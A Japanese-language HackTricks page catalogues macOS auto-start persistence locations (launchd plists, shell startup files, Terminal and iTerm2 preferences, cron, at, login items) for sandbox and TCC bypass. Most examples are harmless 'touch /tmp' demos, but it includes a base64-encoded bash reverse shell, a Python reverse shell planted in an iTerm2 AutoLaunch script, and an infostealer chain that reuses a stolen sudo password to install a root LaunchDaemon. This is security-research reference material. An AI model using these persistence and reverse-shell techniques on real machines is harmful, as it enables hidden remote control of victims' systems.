# macOS Auto Start

{{#include ../banners/hacktricks-training.md}}

このセクションは、ブログシリーズ [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/) に大きく基づいています。目的は、**より多くのAutostart Locations** を追加し、macOSの最新バージョン（13.4）で**現在も機能するTechnique** を可能な限り示し、必要な**Permission** を明記することです。

## Sandbox Bypass

> [!TIP]
> ここでは、**Sandbox Bypass** に役立つStart Locationsを紹介します。これにより、**ファイルへ書き込む**だけで何かを実行し、非常に**一般的な** **Action**、決められた**時間**、またはRoot PermissionなしでSandbox内から通常実行できる**Action**を待つことができます。

### Launchd

- Sandbox Bypassに有用: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Locations

- **`/Library/LaunchAgents`**
- **Trigger**: Reboot
- Rootが必要
- **`/Library/LaunchDaemons`**
- **Trigger**: Reboot
- Rootが必要
- **`/System/Library/LaunchAgents`**
- **Trigger**: Reboot
- Rootが必要
- **`/System/Library/LaunchDaemons`**
- **Trigger**: Reboot
- Rootが必要
- **`~/Library/LaunchAgents`**
- **Trigger**: Relog-in
- **`~/Library/LaunchDemons`**
- **Trigger**: Relog-in

> [!TIP]
> 興味深い事実として、**`launchd`** にはMach-o section `__Text.__config`内にembedded property listがあり、そこにはlaunchdがStartしなければならない、その他のよく知られたServiceが含まれています。さらに、これらのServiceには `RequireSuccess`、`RequireRun`、`RebootOnSuccess` を含めることができ、これはそれらが実行され、正常に完了しなければならないことを意味します。
>
> もちろん、code signingのため変更することはできません。

#### Description & Exploitation

**`launchd`** は、起動時にOX S kernelによって実行される**最初の** **Process**であり、shutdown時に終了する最後のProcessです。常に**PID 1**である必要があります。このProcessは、以下にある**ASEP** **plist**に記載されたConfigurationを**読み取り、実行**します。

- `/Library/LaunchAgents`: AdminによってInstallされたUserごとのAgent
- `/Library/LaunchDaemons`: AdminによってInstallされたSystem-wide Daemon
- `/System/Library/LaunchAgents`: Appleが提供するUserごとのAgent。
- `/System/Library/LaunchDaemons`: Appleが提供するSystem-wide Daemon。

Userがログインすると、`/Users/$USER/Library/LaunchAgents` および `/Users/$USER/Library/LaunchDemons` にあるplistが、**ログインしたUserのPermission**でStartされます。

**AgentとDaemonの主な違いは、AgentはUserがログインしたときにLoadされ、DaemonはSystem startup時にLoadされることです**（sshのように、UserがSystemへAccessする前に実行する必要があるServiceが存在するためです）。また、AgentはGUIを使用できますが、DaemonはBackgroundで実行する必要があります。
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.apple.someidentifier</string>
<key>ProgramArguments</key>
<array>
<string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
</array>
<key>RunAtLoad</key><true/> <!--Execute at system startup-->
<key>StartInterval</key>
<integer>800</integer> <!--Execute each 800s-->
<key>KeepAlive</key>
<dict>
<key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
<!--If previous is true, then re-execute in successful exit-->
</dict>
</dict>
</plist>
```
**ユーザーがログインする前に agent を実行する必要がある**ケースがあります。これらは **PreLoginAgents** と呼ばれます。例えば、ログイン時に支援技術を提供する場合に便利です。これらは `/Library/LaunchAgents` にもあります（例については[**こちら**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents)を参照）。

> [!TIP]
> 新しい Daemons または Agents の設定ファイルは、**次回の再起動後、または** `launchctl load <target.plist>` **を使用した後に読み込まれます**。`launchctl -F <file>` を使用すれば、拡張子のない .plist ファイルを**読み込むことも可能です**（ただし、そのような plist ファイルは再起動後に自動的には読み込まれません）。\
> `launchctl unload <target.plist>` を使用して**アンロード**することも可能です（それによって指定されたプロセスは終了します）。
>
> **Agent** または **Daemon** の**実行を妨げるもの**（override など）が**存在しないことを確認する**には、次を実行します: `sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.smdb.plist`

現在のユーザーによって読み込まれているすべての agents と daemons を一覧表示します:
```bash
launchctl list
```
#### 悪意のある LaunchDaemon chain の例（password reuse）

最近の macOS infostealer は、**captured sudo password** を再利用して user agent と root LaunchDaemon を配置しました:<sup>[[1]](#references)</sup>

- agent loop を `~/.agent` に書き込み、実行可能にする。
- その agent を指す plist を `/tmp/starter` に生成する。
- 盗んだ password を `sudo -S` で再利用し、`/Library/LaunchDaemons/com.finder.helper.plist` にコピーして `root:wheel` を設定し、`launchctl load` でロードする。
- `nohup ~/.agent >/dev/null 2>&1 &` で agent をサイレントに起動し、出力を detach する。
```bash
printf '%s\n' "$pw" | sudo -S cp /tmp/starter /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S chown root:wheel /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S launchctl load /Library/LaunchDaemons/com.finder.helper.plist
nohup "$HOME/.agent" >/dev/null 2>&1 &
```
> [!WARNING]
> plistがユーザーによって所有されている場合、daemonのシステム全体用フォルダ内にあったとしても、**taskはrootとしてではなくユーザーとして実行されます**。これにより、一部の権限昇格攻撃を防止できます。

#### launchdの詳細情報

**`launchd`**は、**kernel**から起動される最初の**user mode process**です。processの起動は**成功**しなければならず、**終了またはクラッシュしてはなりません**。さらに、一部の**killing signals**からも**保護**されています。

`launchd`が最初に行うことの1つは、次のようなすべての**daemons**を**起動**することです。

- **実行時刻に基づくTimer daemons**:
- atd (`com.apple.atrun.plist`): 30分の`StartInterval`を持つ
- crond (`com.apple.systemstats.daily.plist`): 00:15に起動する`StartCalendarInterval`を持つ
- **Network daemons**:
- `org.cups.cups-lpd`: TCP（`SockType: stream`）で`SockServiceName: printer`をlistenする
- SockServiceNameは、ポートまたは`/etc/services`にあるserviceのいずれかでなければならない
- `com.apple.xscertd.plist`: TCPのポート1640でlistenする
- **指定されたpathが変更されたときに実行されるPath daemons**:
- `com.apple.postfix.master`: path `/etc/postfix/aliases`をチェックする
- **IOKit notifications daemons**:
- `com.apple.xartstorageremoted`: `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
- **Mach port:**
- `com.apple.xscertd-helper.plist`: `MachServices`エントリで名前`com.apple.xscertd.helper`を示している
- **UserEventAgent:**
- これは前述のものとは異なります。特定のeventに応答してlaunchdがappsをspawnするようにします。ただし、この場合に関与するmain binaryは`launchd`ではなく`/usr/libexec/UserEventAgent`です。SIPでrestrictedされているfolder `/System/Library/UserEventPlugins/`からpluginsをloadし、各pluginは`XPCEventModuleInitializer` keyでinitializerを指定します。古いpluginsの場合は、`Info.plist`の`CFPluginFactories` dict内にあるkey `FB86416D-6164-2070-726F-70735C216EC0`で指定します。

### shell startup files

Writeup: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)<sup>[[2]](#references)</sup>\
Writeup (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>

- sandboxをbypassするのに有用: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [✅](https://emojipedia.org/check-mark-button)
- ただし、これらのfilesをloadするshellを実行するTCC bypassを持つappを見つける必要がある

#### Locations

- **`~/.zshrc`、`~/.zlogin`、`~/.zshenv.zwc`**、**`~/.zshenv`、`~/.zprofile`**
- **Trigger**: zshでterminalを開く
- **`/etc/zshenv`、`/etc/zprofile`、`/etc/zshrc`、`/etc/zlogin`**
- **Trigger**: zshでterminalを開く
- rootが必要
- **`~/.zlogout`**
- **Trigger**: zshでterminalを終了する
- **`/etc/zlogout`**
- **Trigger**: zshでterminalを終了する
- rootが必要
- さらに存在する可能性がある場所: **`man zsh`**
- **`~/.bashrc`**
- **Trigger**: bashでterminalを開く
- `/etc/profile`（動作しなかった）
- `~/.profile`（動作しなかった）
- `~/.xinitrc`、`~/.xserverrc`、`/opt/X11/etc/X11/xinit/xinitrc.d/`
- **Trigger**: xtermで実行されると想定されるが、xtermが**installされておらず**、install後も次のerrorがthrowされる: xterm: `DISPLAY is not set`<sup>[[3]](#references)</sup>

#### Description & Exploitation

`zsh`や`bash`などのshell environmentを開始すると、**特定のstartup filesが実行されます**。macOSは現在、default shellとして`/bin/zsh`を使用します。このshellは、Terminal applicationがlaunchされたとき、またはSSH経由でdeviceにaccessしたときに自動的にaccessされます。macOSには`bash`と`sh`も存在しますが、使用するには明示的にinvokeする必要があります。<sup>[[2]](#references)</sup>

**`man zsh`**で読むことができるzshのman pageには、startup filesについての長いdescriptionがあります。
```bash
# Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" >> ~/.zshrc
```
### 再開される Applications

> [!CAUTION]
> 指定された exploitation を設定してログアウト後に再度ログインする、または再起動しても、テストでは app は実行されませんでした。これらの操作を実行する際、app が起動中である必要がある可能性があります。

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)<sup>[[4]](#references)</sup>

- sandbox の bypass に有用: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
- **Trigger**: 再起動時に applications を再開

#### Description & Exploitation

再開するすべての applications は plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`<sup>[[4]](#references)</sup> 内にあります。

そのため、再開される applications として自分の app を起動させるには、**自分の app をリストに追加**するだけです。

UUID は、そのディレクトリを一覧表示するか、`ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'` で確認できます。

再開される applications を確認するには、次のコマンドを実行します。
```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
**このリストにアプリケーションを追加する**には、次を使用できます:
```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
-c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
-c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
-c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
-c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
### Terminal Preferences

Writeup: [https://theevilbit.github.io/beyond/beyond_0020/](https://theevilbit.github.io/beyond/beyond_0020/)<sup>[[5]](#references)</sup>

- Sandbox の bypass に有用: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Terminal は、使用するユーザーの FDA permissions を持つ

#### Location

- **`~/Library/Preferences/com.apple.Terminal.plist`**
- **Trigger**: Terminal を開く

#### Description & Exploitation

**`~/Library/Preferences`** には、Applications におけるユーザーの preferences が保存されています。これらの preferences の一部には、**他の applications/scripts を execute** するための configuration を保持できます。<sup>[[5]](#references)</sup>

例えば、Terminal は Startup 時に command を execute できます:

<figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

この config は、**`~/Library/Preferences/com.apple.Terminal.plist`** ファイル内で次のように反映されます:
```bash
[...]
"Window Settings" => {
"Basic" => {
"CommandString" => "touch /tmp/terminal_pwn"
"Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
"FontAntialias" => 1
"FontWidthSpacing" => 1.004032258064516
"name" => "Basic"
"ProfileCurrentVersion" => 2.07
"RunCommandAsShell" => 0
"type" => "Window Settings"
}
[...]
```
つまり、システム内のターミナルの環境設定の plist を上書きできる場合、**`open`** 機能を使用して **ターミナルを開き、そのコマンドを実行させる** ことができます。

これは CLI から次のように追加できます:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```
### Terminal Scripts / その他のファイル拡張子

- sandbox の bypass に便利: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Terminal を使用して、ユーザーの FDA permissions を取得する

#### Location

- **Anywhere**
- **Trigger**: Terminal を開く

#### Description & Exploitation

[**`.terminal`** script](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) を作成して開くと、**Terminal application** が自動的に起動し、その中で指定された commands を実行します。Terminal app が特別な privileges（TCC など）を持っている場合、command はその特別な privileges で実行されます。

次で試してください:
```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CommandString</key>
<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# Use something like the following for a reverse shell:
<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
```
`.command`、`.tool`の拡張子も使用でき、通常の shell scripts の内容を記述すると、これらも Terminal で開かれます。

> [!CAUTION]
> Terminal に **Full Disk Access** がある場合、その action を完了できます（実行された command は terminal window に表示されることに注意してください）。

### Audio Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)<sup>[[6]](#references)</sup>\
Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)<sup>[[7]](#references)</sup>

- sandbox の bypass に有用: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- 追加の TCC access を取得できる可能性があります

#### Location

- **`/Library/Audio/Plug-Ins/HAL`**
- Root が必要
- **Trigger**: coreaudiod または computer を restart
- **`/Library/Audio/Plug-ins/Components`**
- Root が必要
- **Trigger**: coreaudiod または computer を restart
- **`~/Library/Audio/Plug-ins/Components`**
- **Trigger**: coreaudiod または computer を restart
- **`/System/Library/Components`**
- Root が必要
- **Trigger**: coreaudiod または computer を restart

#### Description

以前の writeup によると、**一部の audio plugins を compile**して load させることが可能です。<sup>[[6]](#references)[[7]](#references)</sup>

### QuickLook Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0012/](https://theevilbit.github.io/beyond/beyond_0012/)<sup>[[8]](#references)</sup>

- sandbox の bypass に有用: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- 追加の TCC access を取得できる可能性があります

#### Location

- `/System/Library/QuickLook`
- `/Library/QuickLook`
- `~/Library/QuickLook`
- `/Applications/AppNameHere/Contents/Library/QuickLook/`
- `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Description & Exploitation

QuickLook plugins は、**file の preview を trigger**し（Finder で file を選択した状態で space bar を押す）、その file type をサポートする **plugin が install**されている場合に execute できます。<sup>[[8]](#references)</sup>

独自の QuickLook plugin を compile し、以前の Location のいずれかに配置して load させた後、対応する file に移動して space を押すことで trigger できます。

### ~~Login/Logout Hooks~~

> [!CAUTION]
> user の LoginHook でも root の LogoutHook でも、私の環境では動作しませんでした。

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)<sup>[[9]](#references)</sup>

- sandbox の bypass に有用: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh` のような command を execute できる必要があります
- `Lo`cated in `~/Library/Preferences/com.apple.loginwindow.plist`

これらは deprecated ですが、user が login したときに commands を execute するために使用できます。<sup>[[9]](#references)</sup>
```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```
この設定は`/Users/$USER/Library/Preferences/com.apple.loginwindow.plist`に保存されます。
```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
LoginHook = "/Users/username/hook.sh";
LogoutHook = "/Users/username/hook.sh";
MiniBuddyLaunch = 0;
TALLogoutReason = "Shut Down";
TALLogoutSavesState = 0;
oneTimeSSMigrationComplete = 1;
}
```
削除するには：
```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```
rootユーザーのものは **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`** に保存されています

## Conditional Sandbox Bypass

> [!TIP]
> ここでは、**sandbox bypass** に役立つ start locations を確認できます。これは、**ファイルに書き込む**だけで何かを実行でき、特定の**プログラムがインストールされていること、「一般的ではない」ユーザー**の操作や環境など、あまり一般的ではない条件を想定できる場合に使用できます。

### Cron

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)<sup>[[10]](#references)</sup>

- sandbox bypass に有用: [✅](https://emojipedia.org/check-mark-button)
- ただし、`crontab` binary を実行できる必要があります
- または root である必要があります
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
- 直接書き込むには root が必要です。`crontab <file>` を実行できる場合は root 不要です
- **Trigger**: cron job に依存します

#### Description & Exploitation

次のコマンドで**現在のユーザー**の cron jobs を一覧表示します:
```bash
crontab -l
```
ユーザーのすべての cron jobs は **`/usr/lib/cron/tabs/`** および **`/var/at/tabs/`** でも確認できます（root が必要）。

MacOS では、**一定の頻度**で scripts を実行するいくつかのフォルダが次の場所にあります：
```bash
# The one with the cron jobs is /usr/lib/cron/tabs/
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
```
そこでは通常の **cron** **jobs**、**at** **jobs**（あまり使用されない）、および **periodic** **jobs**（主に一時ファイルのクリーンアップに使用される）を確認できます。daily **periodic** jobsは、例えば次のように実行できます: `periodic daily`.<sup>[[10]](#references)</sup>

**user cronjob**をプログラムで追加するには、次の方法を使用できます:
```bash
echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
crontab /tmp/cron
```
### iTerm2

Writeup: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)<sup>[[11]](#references)</sup>

- sandboxの bypass に有用: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- iTerm2には以前、TCC permissionsが付与されていた

#### Locations

- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
- **Trigger**: iTermを開く
- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
- **Trigger**: iTermを開く
- **`~/Library/Preferences/com.googlecode.iterm2.plist`**
- **Trigger**: iTermを開く

#### Description & Exploitation

**`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**に保存されたScriptsが実行されます。例:<sup>[[11]](#references)</sup>
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
```
または:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
#!/usr/bin/env python3
import iterm2,socket,subprocess,os

async def main(connection):
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
async with iterm2.CustomControlSequenceMonitor(
connection, "shared-secret", r'^create-window$') as mon:
while True:
match = await mon.async_get()
await iterm2.Window.async_create(connection)

iterm2.run_forever(main)
EOF
```
スクリプト **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** も実行されます:
```bash
do shell script "touch /tmp/iterm2-autolaunchscpt"
```
iTerm2の設定は **`~/Library/Preferences/com.googlecode.iterm2.plist`** に保存されており、iTerm2ターミナルを開いたときに**実行するコマンドを指定**できます。

この設定は、iTerm2の設定で構成できます。

<figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

そして、指定したコマンドは設定に反映されます：
```bash
plutil -p com.googlecode.iterm2.plist
{
[...]
"New Bookmarks" => [
0 => {
[...]
"Initial Text" => "touch /tmp/iterm-start-command"
```
実行するコマンドは次のように設定できます:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Call iTerm
open /Applications/iTerm.app/Contents/MacOS/iTerm2

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
```
> [!WARNING]
> **iTerm2 preferences**を悪用して任意のコマンドを実行する方法は、他にも存在する可能性が非常に高いです。

### xbar

Writeup: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)<sup>[[12]](#references)</sup>

- sandboxのバイパスに有用: [✅](https://emojipedia.org/check-mark-button)
- ただし、xbarがインストールされている必要がある
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Accessibility権限を要求する

#### 場所

- **`~/Library/Application\ Support/xbar/plugins/`**
- **トリガー**: xbarが実行された時点

#### 説明

人気のあるプログラム[**xbar**](https://github.com/matryer/xbar)がインストールされている場合、**`~/Library/Application\ Support/xbar/plugins/`**にshell scriptを記述すると、xbarの起動時に実行されます:<sup>[[12]](#references)</sup>
```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```
### Hammerspoon

**解説**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)<sup>[[13]](#references)</sup>

- sandboxのbypassに有用: [✅](https://emojipedia.org/check-mark-button)
- ただし、Hammerspoonがインストールされている必要がある
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Accessibility権限を要求する

#### 場所

- **`~/.hammerspoon/init.lua`**
- **トリガー**: hammerspoonが実行されるとき

#### 説明

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon)は、**LUAスクリプト言語**を利用して動作する、**macOS**向けのautomation platformです。特に、完全なAppleScriptコードの統合やshell scriptsの実行をサポートしており、スクリプト機能を大幅に強化しています。<sup>[[13]](#references)</sup>

アプリは単一のファイル`~/.hammerspoon/init.lua`を探し、起動するとそのscriptが実行されます。
```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```
### BetterTouchTool

- sandbox の bypass に有用: [✅](https://emojipedia.org/check-mark-button)
- ただし BetterTouchTool がインストールされている必要がある
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Automation-Shortcuts および Accessibility の権限を要求する

#### Location

- `~/Library/Application Support/BetterTouchTool/*`

この tool を使用すると、特定の shortcut が押されたときに実行する applications または scripts を指定できる。攻撃者は、**shortcut と action を database に登録して実行する**よう設定し、任意の code を実行できる可能性がある（shortcut は単にキーを押すだけのものでもよい）。

### Alfred

- sandbox の bypass に有用: [✅](https://emojipedia.org/check-mark-button)
- ただし Alfred がインストールされている必要がある
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Automation、Accessibility、さらには Full-Disk access の権限を要求する

#### Location

- `???`

特定の条件が満たされたときに code を実行できる workflow を作成できる。攻撃者が workflow file を作成し、Alfred にロードさせることも可能と考えられる（workflows を使用するには premium version の購入が必要）。

### SSHRC

Writeup: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)<sup>[[14]](#references)</sup>

- sandbox の bypass に有用: [✅](https://emojipedia.org/check-mark-button)
- ssh が有効化され、使用されている必要がある
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- SSH は FDA access を使用する

#### Location

- **`~/.ssh/rc`**
- **Trigger**: ssh による Login
- **`/etc/ssh/sshrc`**
- Root が必要
- **Trigger**: ssh による Login

> [!CAUTION]
> ssh を有効にするには Full Disk Access が必要:
>
> ```bash
> sudo systemsetup -setremotelogin on
> ```

#### Description & Exploitation

デフォルトでは、`/etc/ssh/sshd_config` に `PermitUserRC no` が設定されていない限り、ユーザーが **SSH 経由で Login** すると、scripts **`/etc/ssh/sshrc`** および **`~/.ssh/rc`** が実行される。<sup>[[14]](#references)</sup>

### **Login Items**

Writeup: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)<sup>[[15]](#references)</sup>

- sandbox の bypass に有用: [✅](https://emojipedia.org/check-mark-button)
- ただし、引数付きで `osascript` を実行する必要がある
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Locations

- **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
- **Trigger:** Login
- **`osascript` を呼び出す Exploit payload が保存される
- **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
- **Trigger:** Login
- Root が必要

#### Description

System Preferences -> Users & Groups -> **Login Items** では、**ユーザーが Login したときに実行される items** を確認できる。\
command line から、それらを一覧表示、追加、削除することが可能: <sup>[[15]](#references)</sup>
```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```
これらの項目は **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`** ファイルに保存されます。

**Login items** は、API [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc) を使用して指定することもでき、その設定は **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`** に保存されます。

### ZIP as Login Item

（Login Items に関する前のセクションを確認してください。これはその拡張です）

**ZIP** ファイルを **Login Item** として保存すると、**`Archive Utility`** がそれを開きます。たとえば、その zip が **`~/Library`** に保存され、backdoor を含む **`LaunchAgents/file.plist`** フォルダーが含まれていた場合、そのフォルダーが作成され（デフォルトでは存在しません）、plist が追加されます。これにより、次回ユーザーがログインしたときに、plist で指定された **backdoor が実行されます**。

別の方法として、ユーザーの HOME 内に **`.bash_profile`** と **`.zshenv`** ファイルを作成することもできます。これにより、LaunchAgents フォルダーがすでに存在する場合でも、この technique は機能します。

### At

Writeup: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)<sup>[[16]](#references)</sup>

- sandbox の bypass に有用: [✅](https://emojipedia.org/check-mark-button)
- ただし **`at`** を **execute** する必要があり、**enabled** になっていなければなりません
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`at`** を **execute** する必要があり、**enabled** になっていなければなりません

#### **Description**

`at` tasks は、特定の時刻に実行する **one-time tasks の scheduling** 用に設計されています。cron jobs とは異なり、`at` tasks は実行後に自動的に削除されます。これらの tasks はシステムの reboot 後も persistent であるため、特定の条件下では security concern となる可能性がある点に注意が必要です。<sup>[[16]](#references)</sup>

**default** では **disabled** ですが、**root** user は次のコマンドで **enable** できます。
```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```
これにより、1時間後にファイルが作成されます:
```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```
`atq:` を使用してジョブキューを確認します:
```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```
上記では、スケジュールされた2つのジョブを確認できます。`at -c JOBNUMBER`を使用して、ジョブの詳細を表示できます。
```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
echo 'Execution directory inaccessible' >&2
exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```
